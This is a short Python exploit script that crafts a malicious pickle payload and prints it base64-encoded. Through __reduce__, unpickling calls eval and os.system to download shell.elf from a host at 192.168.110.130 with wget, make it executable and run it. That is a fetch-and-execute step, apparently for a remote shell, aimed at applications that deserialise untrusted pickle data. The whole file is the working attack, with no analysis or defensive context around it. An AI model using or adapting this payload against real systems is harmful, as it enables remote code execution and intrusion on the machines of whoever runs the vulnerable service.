import os
import pickle
from base64 import b64encode

PAYLOAD = "cd /tmp && wget http://192.168.110.130/shell.elf && chmod +x shell.elf && ./shell.elf"


class Exploit(object):
    def __reduce__(self):
        return (eval, ("os.system('" + PAYLOAD + "')",))


exploit_code = pickle.dumps(Exploit())
print(b64encode(exploit_code))